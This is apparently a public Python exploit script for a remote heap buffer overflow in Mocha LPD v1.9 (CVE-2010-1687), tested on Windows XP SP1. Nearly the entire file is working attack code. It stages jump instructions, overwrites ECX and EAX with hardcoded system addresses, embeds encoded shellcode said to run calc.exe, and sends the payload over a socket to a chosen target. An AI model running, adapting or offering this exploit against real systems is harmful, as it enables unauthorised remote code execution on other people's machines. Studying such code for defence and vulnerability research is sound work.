#!/usr/bin/python
# Mocha LPD v1.9 Remote Heap Overflow Exploit
# ol skool 'write 4'
# whoops, I said it was a DoS. My bad. 
# btw yes, I know its 2010 :0)
# CVE: 2010-1687
# tested on XP sp1 
# (use anti debugging to see it work - !hidedebug zwqueryinformationprocess)
# 
# call trace:
# ntdll.RtlAllocateHeap Called from=lpd.0041520B

import sys, socket

print "********************************************************"
print "          Mocha LPD Heap Buffer Overflow Code Execution"
print "                     by mr_me"
print "********************************************************"

if len(sys.argv) < 3:
	print "Usage: " + sys.argv[0] + " <target ip> <port>"
	sys.exit(0)

stage1 = "\x90\x90"
stage1 += "\x61" * 10
stage1 += "\x5b" * 2
stage1 += "\x03\xd2" * 5
stage1 += "\x03\xda" * 47
stage1 += "\xeb\x12"		# jmp down to stage2

stage2 = "\x03\xda" * 125

# aligned to ebx, executes calc.exe via a hardcoded winExec()
# ascii encoded lowercase

sc = ("j314d34djq34djk34d1431s11s7j314d34dj234dkms502ds5o0d35upj02b8"
"8731220222b6f507879729d088b9ck0ngmb9e910")

exploit = "\x05\x64\x65\x66\x61\x75\x6c\x74\x20"
exploit += "\xcc" * (975-len(stage1))
exploit += stage1
exploit += "\xeb\x86"		# jmp up to stage1
exploit += "\x44" * 6
exploit += "\xad\xbb\xc3\x77"	# ECX 0x77C3BBAD --> call dword ptr ds:[EDI+74]
exploit += "\xb4\x73\xed\x77"	# EAX 0x77ED73B4 --> ptr to UnhandledExceptionFilter()
exploit += stage2
exploit += "\x90" * 38		# offset to ebx pointed shellcode
exploit += sc
exploit += "\xcc" * (1500-len(exploit))
exploit += "\x20\x61\x6c\x6c\x0a"

host = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
	connect = s.connect((host,port))
except:
	print "[-] Cant connect!"

s.send("\x02")
print "[+] Sending evil payload.. ph33r o.O"
s.send(exploit)
print '[+] Check for the calc!'
s.close()